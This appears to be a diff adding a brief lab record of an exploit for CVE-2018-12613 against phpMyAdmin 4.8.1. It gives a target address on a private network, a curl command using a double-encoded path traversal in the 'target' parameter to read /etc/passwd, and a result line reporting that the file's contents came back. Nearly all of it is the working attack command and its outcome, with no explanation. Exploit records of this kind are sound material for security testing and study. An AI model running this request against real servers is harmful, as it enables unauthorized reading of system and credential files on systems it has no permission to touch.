@@ -1,0 +1,6 @@
+﻿CVE-2018-12613 - vulnerable phpMyAdmin 4.8.1
+target: http://192.168.99.100:8080
+command:
+  curl --path-as-is -s "http://192.168.99.100:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd"
+--- result ---
+HTTP 200 (response 45,877 bytes) - the page embeds the contents of /etc/passwd
